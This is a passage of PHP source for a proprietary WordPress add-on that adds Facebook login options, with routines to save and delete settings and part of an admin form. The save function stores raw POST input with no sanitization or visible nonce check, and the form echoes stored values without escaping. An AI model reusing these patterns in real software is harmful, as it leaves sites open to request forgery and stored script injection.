<?php

/*
 * WP-FB-AutoConnect Premium Add-On
 * http://www.justin-klein.com/projects/wp-fb-autoconnect
 * 
 * This file does not operate as a standalone plugin; it must be used in conjunction with WP-FB-AutoConnect,
 * which you can download for free from Wordpress.org.  To install the add-on, just upload this file 
 * (WP-FB-AutoConnect-Premium.php) to your Wordpress plugins directory and the options will be automatically 
 * added to your admin panel. 
 * 
 * Disclaimer:
 * The code below is owned exclusively by Justin Klein (www.justin-klein.com)
 * You are permitted to modify the code below for personal use.
 * You are not permitted to share, sell, or in any way distribute any of the code below.
 * You are not permitted to share, sell, or in any way distribute any work derived from the code below,
 * including new plugins that may include similar functionality.
 * You are not permitted to instruct others on how to reproduce the behavior implemented below.
 * Basically, you can use this plugin however you like *on your own site*; just don't share it with anyone else :)
 *   
 */


/**********************************************************************/
/**********************************************************************/
/***************************SANITY CHECK*******************************/
/**********************************************************************/
/**********************************************************************/ 

//If the user has an out-of-date core plugin, don't include the Premium addon. This defines the minimum required core vesion.
define('JFB_PREMIUM_REQUIREDVER', '4.3.0');

//Show an error message if the core plugin is out-of-date (detected in the next block below).
add_action('admin_notices', 'jfb_check_premium_version');
function jfb_check_premium_version()
{
	global $jfb_version, $jfb_flag_outofdate;
    if( $jfb_flag_outofdate )
	{
		?><div class="error"><p><strong><?php _e('Warning', 'wp-fb-autoconnect')?>:</strong> <?php echo sprintf(__('The WP-FB-AutoConnect Premium Addon you\'re using requires WP-FB-AutoConnect %s or newer (you currently have %s).  Please update your WP-FB-AutoConnect plugin.','wp-fb-autoconnect'),JFB_PREMIUM_REQUIREDVER, $jfb_version)?></p></div><?php 
	}
}

//If the core plugin is out-of-date, set a flag (for the above block) and stop including this script.
global $jfb_version, $jfb_flag_outofdate;
$jfb_flag_outofdate = false;
if( version_compare($jfb_version, JFB_PREMIUM_REQUIREDVER) == -1 )
{
	$jfb_flag_outofdate = true;
	return;
}



/**********************************************************************/
/**********************************************************************/
/*************************PREMIUM OPTIONS******************************/
/**********************************************************************/
/**********************************************************************/

//Identify the premium version as being present & available
define('JFB_PREMIUM', 8413);
define('JFB_PREMIUM_VER', 42);
if(!defined('WPINC')) { echo "WP-FB-AutoConnect Premium<br/>Version: ".JFB_PREMIUM_VER."<br/>Number: ".JFB_PREMIUM;exit;}

//Override plugin name
global $jfb_name, $jfb_version;
$jfb_name = "WP-FB AutoConnect Premium";

//Define new premium options
global $opt_jfbp_notifyusers, $opt_jfbp_notifyusers_content, $opt_jfbp_notifyusers_subject;
global $opt_jfbp_commentfrmlogin, $opt_jfbp_wploginfrmlogin, $opt_jfbp_registrationfrmlogin, $opt_jfbp_bpregistrationfrmlogin, $opt_jfbp_cache_avatars, $opt_jfbp_cache_avatars_fullsize, $opt_jfbp_cache_avatar_dir, $opt_jfbp_cachedir_changetoblog;
global $opt_jfbp_buttonstyle, $opt_jfbp_buttonsize, $opt_jfbp_buttontext, $opt_jfbp_buttonimg, $opt_jfbp_requirerealmail;
global $opt_jfbp_redirect_new, $opt_jfbp_redirect_new_custom, $opt_jfbp_redirect_existing, $opt_jfbp_redirect_existing_custom, $opt_jfbp_redirect_logout, $opt_jfbp_redirect_logout_custom;
global $opt_jfbp_restrict_reg, $opt_jfbp_restrict_reg_url, $opt_jfbp_restrict_reg_uid, $opt_jfbp_restrict_reg_pid, $opt_jfbp_restrict_reg_gid;
global $opt_jfbp_show_spinner, $opt_jfbp_allow_link, $opt_jfbp_allow_disassociate, $opt_jfbp_autoregistered_role;
global $opt_jfbp_wordbooker_integrate, $opt_jfbp_signupfrmlogin;
global $opt_jfbp_localize_facebook;
global $opt_jfbp_first_activation;
global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings;
global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent;
global $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
global $opt_jfbp_latestversion, $opt_jfbp_hide_updatenote_till_ver;
global $opt_jfbp_invalids, $opt_jfbp_email_rejected_msg, $opt_jfbp_avatar_full_dimensions_w, $opt_jfbp_avatar_full_dimensions_h;
global $opt_jfbp_email_notsetup, $opt_jfbp_email_notsetup_exception;
global $opt_jfbp_link_buttontext, $opt_jfbp_unlink_buttontext;
$opt_jfbp_notifyusers = "jfb_p_notifyusers";
$opt_jfbp_notifyusers_subject = "jfb_p_notifyusers_subject";
$opt_jfbp_notifyusers_content = "jfb_p_notifyusers_content";
$opt_jfbp_commentfrmlogin = "jfb_p_commentformlogin";
$opt_jfbp_wploginfrmlogin = "jfb_p_wploginformlogin";
$opt_jfbp_registrationfrmlogin = "jfb_p_registrationformlogin";
$opt_jfbp_bpregistrationfrmlogin = "jfb_p_bpregistrationformlogin";
$opt_jfbp_cache_avatars = "jfb_p_cacheavatars";
$opt_jfbp_cache_avatars_fullsize = "jfb_p_cacheavatars_full";
$opt_jfbp_cache_avatar_dir = "jfb_p_cacheavatar_dir";
$opt_jfbp_cachedir_changetoblog = "jfb_p_cachedir_changetoblog";
$opt_jfbp_buttonstyle = "jfb_p_buttonstyle";
$opt_jfbp_buttonsize = "jfb_p_buttonsize";
$opt_jfbp_buttontext = "jfb_p_buttontext";
$opt_jfbp_buttonimg = "jfb_p_buttonimg";
$opt_jfbp_requirerealmail = "jfb_p_requirerealmail";
$opt_jfbp_redirect_new = 'jfb_p_redirect_new';
$opt_jfbp_redirect_new_custom = 'jfb_p_redirect_new_custom';
$opt_jfbp_redirect_existing = 'jfb_p_redirect_existing';
$opt_jfbp_redirect_existing_custom = 'jfb_p_redirect_new_existing';
$opt_jfbp_redirect_logout = 'jfb_p_redirect_logout';
$opt_jfbp_redirect_logout_custom = 'jfb_p_redirect_logout_custom';
$opt_jfbp_restrict_reg = 'jfb_p_restrict_reg';
$opt_jfbp_restrict_reg_url = 'jfb_p_restrict_reg_url';
$opt_jfbp_restrict_reg_uid = 'jfb_p_restrict_reg_uid';
$opt_jfbp_restrict_reg_pid = 'jfb_p_restrict_reg_pid';
$opt_jfbp_restrict_reg_gid = 'jfb_p_restrict_reg_gid';
$opt_jfbp_show_spinner = 'jfb_p_show_spinner';
$opt_jfbp_autoregistered_role = 'jfb_p_autoregistered_role';
$opt_jfbp_allow_link = 'jfb_p_allow_link';
$opt_jfbp_allow_disassociate = 'jfb_p_allow_disassociate';
$opt_jfbp_wordbooker_integrate = 'jfb_p_wordbooker_integrate';
$opt_jfbp_signupfrmlogin = 'jfb_p_signupformlogin';
$opt_jfbp_localize_facebook = 'jfb_p_localize_facebook';
$opt_jfbp_first_activation = 'jfb_p_first_activation';
$opt_jfbp_xprofile_map = "jfb_p_xprofile_map";
$opt_jfbp_xprofile_mappings = "jfb_p_xprofile_mappings";
$opt_jfbp_bpstream_login = "jfb_p_bpstream_login";
$opt_jfbp_bpstream_logincontent = "jfb_p_bpstream_logincontent";
$opt_jfbp_bpstream_register = "jfb_p_bpstream_register";
$opt_jfbp_bpstream_registercontent = "jfb_p_bpstream_registercontent";
$opt_jfbp_latestversion = 'jfb_p_latestversion';
$opt_jfbp_hide_updatenote_till_ver = 'jfb_p_hide_latestversion';
$opt_jfbp_invalids = "jfbp_invalids";
$opt_jfbp_email_rejected_msg = "jfbp_email_rejected_msg";
$opt_jfbp_email_notsetup = "jfbp_email_notsetup";
$opt_jfbp_email_notsetup_exception = "jfbp_email_notsetup_exception";
$opt_jfbp_avatar_full_dimensions_w = "jfbp_avatar_full_dimensions_w";
$opt_jfbp_avatar_full_dimensions_h = "jfbp_avatar_full_dimensions_h";
$opt_jfbp_link_buttontext = "jfbp_link_buttontext";
$opt_jfbp_unlink_buttontext = "jfbp_unlink_buttontext";

//A prefix to identify POSTed fields when updating the xprofile mappings option.
//This is not stored in the database, it's simply used to convert the separate POST vars into a single array (which IS stored as $opt_jfbp_xprofile_mappings).
global $jfb_xprofile_field_prefix;
$jfb_xprofile_field_prefix = "xfield_";


//Called when we save our options in the admin panel
function jfb_update_premium_opts()
{
    global $_POST, $jfb_name, $jfb_version;
    global $opt_jfbp_notifyusers, $opt_jfbp_notifyusers_content, $opt_jfbp_notifyusers_subject;
    global $opt_jfbp_commentfrmlogin, $opt_jfbp_wploginfrmlogin, $opt_jfbp_registrationfrmlogin, $opt_jfbp_bpregistrationfrmlogin, $opt_jfbp_cache_avatars, $opt_jfbp_cache_avatars_fullsize, $opt_jfbp_cache_avatar_dir, $opt_jfbp_cachedir_changetoblog;
    global $opt_jfbp_buttonstyle, $opt_jfbp_buttonsize, $opt_jfbp_buttontext, $opt_jfbp_buttonimg, $opt_jfbp_requirerealmail;
    global $opt_jfbp_redirect_new, $opt_jfbp_redirect_new_custom, $opt_jfbp_redirect_existing, $opt_jfbp_redirect_existing_custom, $opt_jfbp_redirect_logout, $opt_jfbp_redirect_logout_custom;
    global $opt_jfbp_restrict_reg, $opt_jfbp_restrict_reg_url, $opt_jfbp_restrict_reg_uid, $opt_jfbp_restrict_reg_pid, $opt_jfbp_restrict_reg_gid;
    global $opt_jfbp_show_spinner, $opt_jfbp_allow_link, $opt_jfbp_allow_disassociate, $opt_jfbp_autoregistered_role;
    global $opt_jfbp_wordbooker_integrate, $opt_jfbp_signupfrmlogin, $opt_jfbp_localize_facebook;
    global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings, $jfb_xprofile_field_prefix;
	global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent, $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
	global $opt_jfbp_email_rejected_msg, $opt_jfbp_avatar_full_dimensions_w, $opt_jfbp_avatar_full_dimensions_h;
    global $opt_jfbp_link_buttontext, $opt_jfbp_unlink_buttontext, $opt_jfbp_email_notsetup, $opt_jfbp_email_notsetup_exception;
	
    update_option( $opt_jfbp_notifyusers,  isset( $_POST[$opt_jfbp_notifyusers] ) ? $_POST[$opt_jfbp_notifyusers] : 0 );
    update_option( $opt_jfbp_notifyusers_subject, stripslashes($_POST[$opt_jfbp_notifyusers_subject]) );
    update_option( $opt_jfbp_notifyusers_content, stripslashes($_POST[$opt_jfbp_notifyusers_content]) );
    update_option( $opt_jfbp_commentfrmlogin, isset( $_POST[$opt_jfbp_commentfrmlogin] ) ? $_POST[$opt_jfbp_commentfrmlogin] : 0 );
    update_option( $opt_jfbp_wploginfrmlogin, isset( $_POST[$opt_jfbp_wploginfrmlogin] ) ? $_POST[$opt_jfbp_wploginfrmlogin] : 0 );
    update_option( $opt_jfbp_registrationfrmlogin, isset( $_POST[$opt_jfbp_registrationfrmlogin] ) ? $_POST[$opt_jfbp_registrationfrmlogin] : 0 );
    update_option( $opt_jfbp_bpregistrationfrmlogin, isset( $_POST[$opt_jfbp_bpregistrationfrmlogin] ) ? $_POST[$opt_jfbp_bpregistrationfrmlogin] : 0 );
    update_option( $opt_jfbp_cache_avatars, isset( $_POST[$opt_jfbp_cache_avatars] ) ? $_POST[$opt_jfbp_cache_avatars] : 0 );
	update_option( $opt_jfbp_cache_avatars_fullsize, isset( $_POST[$opt_jfbp_cache_avatars_fullsize] ) ? $_POST[$opt_jfbp_cache_avatars_fullsize] : 0 );
    update_option( $opt_jfbp_cache_avatar_dir, $_POST[$opt_jfbp_cache_avatar_dir] );
    update_option( $opt_jfbp_cachedir_changetoblog, isset($_POST[$opt_jfbp_cachedir_changetoblog])?$_POST[$opt_jfbp_cachedir_changetoblog]:0 );
    update_option( $opt_jfbp_buttonstyle, $_POST[$opt_jfbp_buttonstyle] );
    update_option( $opt_jfbp_buttonsize, $_POST[$opt_jfbp_buttonsize] );
    update_option( $opt_jfbp_buttontext, $_POST[$opt_jfbp_buttontext] );
    update_option( $opt_jfbp_buttonimg, $_POST[$opt_jfbp_buttonimg] );
    update_option( $opt_jfbp_redirect_new, $_POST[$opt_jfbp_redirect_new] );
    update_option( $opt_jfbp_redirect_new_custom, $_POST[$opt_jfbp_redirect_new_custom] );
    update_option( $opt_jfbp_redirect_existing, $_POST[$opt_jfbp_redirect_existing] );
    update_option( $opt_jfbp_redirect_existing_custom, $_POST[$opt_jfbp_redirect_existing_custom] );
    update_option( $opt_jfbp_redirect_logout, $_POST[$opt_jfbp_redirect_logout] );
    update_option( $opt_jfbp_redirect_logout_custom, $_POST[$opt_jfbp_redirect_logout_custom] );
    update_option( $opt_jfbp_restrict_reg, isset($_POST[$opt_jfbp_restrict_reg])?$_POST[$opt_jfbp_restrict_reg]:0 );
    update_option( $opt_jfbp_restrict_reg_url, $_POST[$opt_jfbp_restrict_reg_url] );
    update_option( $opt_jfbp_restrict_reg_uid, $_POST[$opt_jfbp_restrict_reg_uid] );
    update_option( $opt_jfbp_restrict_reg_pid, $_POST[$opt_jfbp_restrict_reg_pid] );
    update_option( $opt_jfbp_restrict_reg_gid, isset($_POST[$opt_jfbp_restrict_reg_gid])?$_POST[$opt_jfbp_restrict_reg_gid]:0 );
    update_option( $opt_jfbp_show_spinner, $_POST[$opt_jfbp_show_spinner] );
	update_option( $opt_jfbp_allow_link, isset( $_POST[$opt_jfbp_allow_link] ) ? $_POST[$opt_jfbp_allow_link] : 0 );
	update_option( $opt_jfbp_allow_disassociate, isset( $_POST[$opt_jfbp_allow_disassociate] ) ? $_POST[$opt_jfbp_allow_disassociate] : 0 );
	update_option( $opt_jfbp_autoregistered_role, $_POST[$opt_jfbp_autoregistered_role] );
    update_option( $opt_jfbp_wordbooker_integrate, isset( $_POST[$opt_jfbp_wordbooker_integrate] ) ? $_POST[$opt_jfbp_wordbooker_integrate] : 0 );
    update_option( $opt_jfbp_signupfrmlogin, isset( $_POST[$opt_jfbp_signupfrmlogin] ) ? $_POST[$opt_jfbp_signupfrmlogin] : 0 );
    update_option( $opt_jfbp_localize_facebook, isset( $_POST[$opt_jfbp_localize_facebook] ) ? $_POST[$opt_jfbp_localize_facebook] : 0 );
    update_option( $opt_jfbp_requirerealmail, isset( $_POST[$opt_jfbp_requirerealmail] ) ? $_POST[$opt_jfbp_requirerealmail] : 0 );
    update_option( $opt_jfbp_xprofile_map, isset( $_POST[$opt_jfbp_xprofile_map] ) ? $_POST[$opt_jfbp_xprofile_map] : 0 );
	update_option( $opt_jfbp_bpstream_login, isset( $_POST[$opt_jfbp_bpstream_login] ) ? $_POST[$opt_jfbp_bpstream_login] : 0 );
	update_option( $opt_jfbp_bpstream_logincontent, $_POST[$opt_jfbp_bpstream_logincontent] );
	update_option( $opt_jfbp_bpstream_register, isset( $_POST[$opt_jfbp_bpstream_register] ) ? $_POST[$opt_jfbp_bpstream_register] : 0 );
	update_option( $opt_jfbp_bpstream_registercontent, $_POST[$opt_jfbp_bpstream_registercontent] );
	update_option( $opt_jfbp_email_rejected_msg, $_POST[$opt_jfbp_email_rejected_msg] );
    update_option( $opt_jfbp_email_notsetup, $_POST[$opt_jfbp_email_notsetup] );
    update_option( $opt_jfbp_email_notsetup_exception, isset( $_POST[$opt_jfbp_email_notsetup_exception] ) ? $_POST[$opt_jfbp_email_notsetup_exception] : 0 );
	update_option( $opt_jfbp_avatar_full_dimensions_w, $_POST[$opt_jfbp_avatar_full_dimensions_w] );
	update_option( $opt_jfbp_avatar_full_dimensions_h, $_POST[$opt_jfbp_avatar_full_dimensions_h] );
    update_option( $opt_jfbp_link_buttontext, $_POST[$opt_jfbp_link_buttontext] );
    update_option( $opt_jfbp_unlink_buttontext, $_POST[$opt_jfbp_unlink_buttontext] );
    
    //The only option that needs special handling is the xprofile mappings array; its elements come in as
    //separate POST vars prefixed by $jfb_xprofile_field_prefix; here, I combine them into the array that actually gets stored to the DB.
    $xprofile_map = array();
    foreach($_POST as $key => $value)
    {
        if( strpos($key, $jfb_xprofile_field_prefix) === FALSE ) continue;
        $fieldID = substr($key, strlen($jfb_xprofile_field_prefix));
        $xprofile_map[$fieldID] = $value;
    }
    update_option($opt_jfbp_xprofile_mappings, $xprofile_map);
    do_action('wpfb_p_update_options');
    ?><div class="updated"><p><strong><?php _e("Options saved", "wp-fb-autoconnect")?></strong></p></div><?php    
}

//Called to delete our options from the admin panel
function jfb_delete_premium_opts()
{
    global $opt_jfbp_notifyusers, $opt_jfbp_notifyusers_content, $opt_jfbp_notifyusers_subject;
    global $opt_jfbp_commentfrmlogin, $opt_jfbp_wploginfrmlogin, $opt_jfbp_registrationfrmlogin, $opt_jfbp_bpregistrationfrmlogin, $opt_jfbp_cache_avatars, $opt_jfbp_cache_avatars_fullsize, $opt_jfbp_cache_avatar_dir, $opt_jfbp_cachedir_changetoblog;
    global $opt_jfbp_buttonstyle, $opt_jfbp_buttonsize, $opt_jfbp_buttontext, $opt_jfbp_buttonimg, $opt_jfbp_requirerealmail;
    global $opt_jfbp_redirect_new, $opt_jfbp_redirect_new_custom, $opt_jfbp_redirect_existing, $opt_jfbp_redirect_existing_custom, $opt_jfbp_redirect_logout, $opt_jfbp_redirect_logout_custom;
    global $opt_jfbp_restrict_reg, $opt_jfbp_restrict_reg_url, $opt_jfbp_restrict_reg_uid, $opt_jfbp_restrict_reg_pid, $opt_jfbp_restrict_reg_gid;
    global $opt_jfbp_show_spinner, $opt_jfbp_allow_link, $opt_jfbp_allow_disassociate, $opt_jfbp_autoregistered_role;
    global $opt_jfbp_wordbooker_integrate, $opt_jfbp_signupfrmlogin, $opt_jfbp_localize_facebook;
    global $opt_jfbp_first_activation;
    global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings;
	global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent, $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
	global $opt_jfbp_latestversion, $opt_jfbp_hide_updatenote_till_ver, $opt_jfbp_email_rejected_msg, $opt_jfbp_avatar_full_dimensions_w;
	global $opt_jfbp_avatar_full_dimensions_h, $opt_jfbp_email_notsetup, $opt_jfbp_email_notsetup_exception;
    global $opt_jfbp_link_buttontext, $opt_jfbp_unlink_buttontext;
    delete_option($opt_jfbp_notifyusers);
    delete_option($opt_jfbp_notifyusers_subject);
    delete_option($opt_jfbp_notifyusers_content);
    delete_option($opt_jfbp_commentfrmlogin);
    delete_option($opt_jfbp_wploginfrmlogin);
    delete_option($opt_jfbp_registrationfrmlogin);
    delete_option($opt_jfbp_bpregistrationfrmlogin);
    delete_option($opt_jfbp_cache_avatars);
	delete_option($opt_jfbp_cache_avatars_fullsize);
    delete_option($opt_jfbp_cache_avatar_dir);
    delete_option($opt_jfbp_cachedir_changetoblog);
    delete_option($opt_jfbp_buttonstyle);
    delete_option($opt_jfbp_buttonsize);
    delete_option($opt_jfbp_buttontext);
    delete_option($opt_jfbp_buttonimg);
    delete_option($opt_jfbp_requirerealmail);
    delete_option($opt_jfbp_redirect_new);
    delete_option($opt_jfbp_redirect_new_custom);
    delete_option($opt_jfbp_redirect_existing);
    delete_option($opt_jfbp_redirect_existing_custom);
    delete_option($opt_jfbp_redirect_logout);
    delete_option($opt_jfbp_redirect_logout_custom);
    delete_option($opt_jfbp_restrict_reg);
    delete_option($opt_jfbp_restrict_reg_url);
    delete_option($opt_jfbp_restrict_reg_uid);
    delete_option($opt_jfbp_restrict_reg_pid);
    delete_option($opt_jfbp_restrict_reg_gid);
    delete_option($opt_jfbp_show_spinner);
    delete_option($opt_jfbp_allow_link);
	delete_option($opt_jfbp_allow_disassociate);
	delete_option($opt_jfbp_autoregistered_role);
    delete_option($opt_jfbp_wordbooker_integrate);
    delete_option($opt_jfbp_signupfrmlogin);
    delete_option($opt_jfbp_localize_facebook);
    delete_option($opt_jfbp_first_activation);
    delete_option($opt_jfbp_xprofile_map);
    delete_option($opt_jfbp_xprofile_mappings);
	delete_option($opt_jfbp_bpstream_login);
	delete_option($opt_jfbp_bpstream_logincontent);
	delete_option($opt_jfbp_bpstream_register);
	delete_option($opt_jfbp_bpstream_registercontent);
	delete_option($opt_jfbp_latestversion);
	delete_option($opt_jfbp_hide_updatenote_till_ver);
	delete_option($opt_jfbp_email_rejected_msg);
    delete_option($opt_jfbp_email_notsetup);
    delete_option($opt_jfbp_email_notsetup_exception);
	delete_option($opt_jfbp_avatar_full_dimensions_w);
	delete_option($opt_jfbp_avatar_full_dimensions_h);
    delete_option($opt_jfbp_link_buttontext);
    delete_option($opt_jfbp_unlink_buttontext);
}


/**********************************************************************/
/**********************************************************************/
/**************************ADMIN PANEL*********************************/
/**********************************************************************/
/**********************************************************************/

function jfb_output_premium_panel()
{
    global $jfb_homepage;
    global $opt_jfbp_notifyusers, $opt_jfbp_notifyusers_subject, $opt_jfbp_notifyusers_content, $opt_jfbp_commentfrmlogin, $opt_jfbp_wploginfrmlogin, $opt_jfbp_registrationfrmlogin, $opt_jfbp_bpregistrationfrmlogin, $opt_jfbp_cache_avatars, $opt_jfbp_cache_avatars_fullsize, $opt_jfbp_cache_avatar_dir, $opt_jfbp_cachedir_changetoblog;
    global $opt_jfbp_buttonstyle, $opt_jfbp_buttonsize, $opt_jfbp_buttontext, $opt_jfbp_buttonimg, $opt_jfbp_requirerealmail;
    global $opt_jfbp_redirect_new, $opt_jfbp_redirect_new_custom, $opt_jfbp_redirect_existing, $opt_jfbp_redirect_existing_custom, $opt_jfbp_redirect_logout, $opt_jfbp_redirect_logout_custom;
    global $opt_jfbp_restrict_reg, $opt_jfbp_restrict_reg_url, $opt_jfbp_restrict_reg_uid, $opt_jfbp_restrict_reg_pid, $opt_jfbp_restrict_reg_gid;
    global $opt_jfbp_show_spinner, $opt_jfbp_allow_link, $opt_jfbp_allow_disassociate, $opt_jfbp_autoregistered_role, $jfb_data_url;
    global $opt_jfbp_wordbooker_integrate, $opt_jfbp_signupfrmlogin, $opt_jfbp_localize_facebook;
    global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings, $jfb_xprofile_field_prefix;
	global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent, $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
	global $opt_jfbp_email_rejected_msg, $opt_jfbp_avatar_full_dimensions_w, $opt_jfbp_avatar_full_dimensions_h, $opt_jfbp_email_notsetup, $opt_jfbp_email_notsetup_exception;
    global $opt_jfbp_link_buttontext, $opt_jfbp_unlink_buttontext;
    function disableatt() { echo (defined('JFB_PREMIUM')?"":"disabled='disabled'"); }
    ?>
    <!--Show the Premium version number along with a link to immediately check for updates-->
    <form name="formPremUpdateCheck" method="post" action="">
        <h3><?php _e('Premium Options', 'wp-fb-autoconnect')?> <?php echo (defined('JFB_PREMIUM_VER')?"<span style='font-size:x-small;'>(<a href=\"javascript:document.formPremUpdateCheck.submit();\">".__('Check for Updates', 'wp-fb-autoconnect')."</a>)</span>":""); ?></h3>
        <input type="hidden" name="VersionCheckNow" value="1" />
    </form>
    
    <?php 
    if( !defined('JFB_PREMIUM') )
        echo "<div class=\"jfb-admin_warning\"><i><b>".__("The following options are available to Premium users only.", "wp-fb-autoconnect")."</b><br />".__("For information about the WP-FB-AutoConnect Premium Add-On, including purchasing instructions, please visit the plugin homepage:","wp-fb-autoconnect") . " <b><a target='preminfo' href=\"$jfb_homepage#premium\">here</a></b></i>.</div>";
    ?>
    
    <form name="formPremOptions" method="post" action="">
    
        <b><?php _e('MultiSite Support', 'wp-fb-autoconnect')?>:</b><br/>
        <input disabled='disabled' type="checkbox" name="musupport" value="1" <?php echo ((defined('JFB_PREMIUM')&&function_exists('is_multisite')&&is_multisite())?"checked='checked'":"")?> >
        <?php _e('Automatically enabled when a MultiSite install is detected', 'wp-fb-autoconnect')?>
        <?php jfb_output_simple_lightbox("", __("The free plugin is not aware of users registered on other sites in your Multisite installation, which can result in problems i.e. if someone tries to register on more than one site.  The Premium version will actively detect and handle existing users across all your sites.", "wp-fb-autoconnect"))?><br /><br />

        <b><?php _e('E-Mail Permissions', 'wp-fb-autoconnect')?>:</b><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_requirerealmail?>" value="1" <?php echo get_option($opt_jfbp_requirerealmail)?'checked="checked"':''?> /> <?php _e("Request and REQUIRE access to user's email address", 'wp-fb-autoconnect')?>
        <?php jfb_output_simple_lightbox("", __("The basic option to request user email addresses will prompt your visitors, but they can still choose not to share it (in the Facebook login prompt).  This option performs a secondary check to REQUIRE them to share; if they don't, the site won't log them in (until they click the button again, and agree to share their address).", 'wp-fb-autoconnect'))?><br />
        <?php add_option($opt_jfbp_email_rejected_msg, __("Sorry, this site requires an email address to log you in.",'wp-fb-autoconnect'));?>
        <?php add_option($opt_jfbp_email_notsetup, __("Sorry, this site requires an e-mail address to log you in, but it appears that you do not have an e-mail setup on your Facebook account. Please login to Facebook &amp; register an e-mail, then try to login again.",'wp-fb-autoconnect'));?>
        <input <?php disableatt() ?> type="checkbox" class="noemailexception" name="<?php echo $opt_jfbp_email_notsetup_exception?>" value="1" <?php echo get_option($opt_jfbp_email_notsetup_exception)?'checked="checked"':''?> /> <?php _e("...Grant exception for Facebook accounts that don't have an e-mail (phone number only)", 'wp-fb-autoconnect')?><br/>
        <?php _e("Message to users who deny e-mail access:", 'wp-fb-autoconnect')?> <input <?php disableatt() ?> type="text" size="55" name="<?php echo $opt_jfbp_email_rejected_msg; ?>" value="<?php echo get_option($opt_jfbp_email_rejected_msg); ?>" /><br />
        <div id="noemailexceptiontext" style="display:block;">
            <?php _e("Message to users whose FB accounts have no email (phone number only):", 'wp-fb-autoconnect')?> <input <?php disableatt() ?> type="text" size="55" name="<?php echo $opt_jfbp_email_notsetup; ?>" value="<?php echo get_option($opt_jfbp_email_notsetup); ?>" /><br />
            <script type="text/javascript">
                jQuery(document).ready(function ()
                {
                    if (jQuery('input.noemailexception').is(':checked')) jQuery('#noemailexceptiontext').hide();
                    jQuery('.noemailexception').change(function ()
                    {
                        if (this.checked)
                            jQuery('#noemailexceptiontext').hide();
                        else
                            jQuery('#noemailexceptiontext').show();
                    });
                });
            </script> 
        </div><br />

        <b><?php _e('Button Style', 'wp-fb-autoconnect')?>:</b><br />
        <?php add_option($opt_jfbp_buttontext, "Login with Facebook");
        add_option($opt_jfbp_buttonsize, "2");
        $btnDefault = $jfb_data_url . "/assets/btn01.png";
        add_option($opt_jfbp_buttonimg, $btnDefault);
        $btnPreview = get_option($opt_jfbp_buttonimg);
        if(!$btnPreview) $btnPreview = $btnDefault;
        ?>

        <input <?php disableatt() ?> type="radio" style="float:left;" name="<?php echo $opt_jfbp_buttonstyle; ?>" value="0" <?php echo (get_option($opt_jfbp_buttonstyle)==0?"checked='checked'":"")?>>
        <div class="jfb-greybox" style="float:left;">
            <b><?php _e('Original', 'wp-fb-autoconnect')?> (xfbml):</b><br/>
            <?php _e('Text', 'wp-fb-autoconnect')?>: <input <?php disableatt() ?> type="text" size="30" name="<?php echo $opt_jfbp_buttontext; ?>" value="<?php echo get_option($opt_jfbp_buttontext); ?>" /><br />
            <?php _e('Style', 'wp-fb-autoconnect')?>: 
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="2" <?php echo (get_option($opt_jfbp_buttonsize)==2?"checked='checked'":"")?>><?php _e('Small', 'wp-fb-autoconnect')?>
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="3" <?php echo (get_option($opt_jfbp_buttonsize)==3?"checked='checked'":"")?>><?php _e('Medium', 'wp-fb-autoconnect')?>
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="4" <?php echo (get_option($opt_jfbp_buttonsize)==4?"checked='checked'":"")?>><?php _e('Large', 'wp-fb-autoconnect')?>
            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="5" <?php echo (get_option($opt_jfbp_buttonsize)==5?"checked='checked'":"")?>><?php _e('X-Large', 'wp-fb-autoconnect')?><br />
        </div><br clear="all"/>
        <input <?php disableatt() ?> type="radio" style="float:left;" name="<?php echo $opt_jfbp_buttonstyle; ?>" value="1" <?php echo (get_option($opt_jfbp_buttonstyle)==1?"checked='checked'":"")?>>
        <div class="jfb-greybox" style="float:left;">
            <b><?php _e('Image (styleable)', 'wp-fb-autoconnect')?>:</b><br/>
            <?php _e('URL', 'wp-fb-autoconnect')?>: <input <?php disableatt() ?> type="text" size="80" name="<?php echo $opt_jfbp_buttonimg; ?>" value="<?php echo get_option($opt_jfbp_buttonimg); ?>" /><br/>
            <?php _e('Preview', 'wp-fb-autoconnect')?>: <img style="vertical-align:middle;margin-top:5px;" src="<?php echo $btnPreview?>" alt="(Login Button)" />
        </div><br clear="all"/><br/>
        
        <b><?php _e('Additional Buttons', 'wp-fb-autoconnect')?>:</b><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_commentfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_commentfrmlogin)?'checked="checked"':''?> /> <?php _e('Add a Facebook Login button below the comment form', 'wp-fb-autoconnect')?><br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_wploginfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_wploginfrmlogin)?'checked="checked"':''?> /> <?php _e('Add a Facebook Login button to the standard Login page', 'wp-fb-autoconnect')?> (wp-login.php)<br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_registrationfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_registrationfrmlogin)?'checked="checked"':''?> /> <?php _e('Add a Facebook Login button to the Registration page', 'wp-fb-autoconnect')?> (wp-login.php)<br />
        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpregistrationfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_bpregistrationfrmlogin)?'checked="checked"':''?> /> <?php _e('Add a Facebook Login button to the BuddyPress Registration page', 'wp-fb-autoconnect')?> (/register)<br />
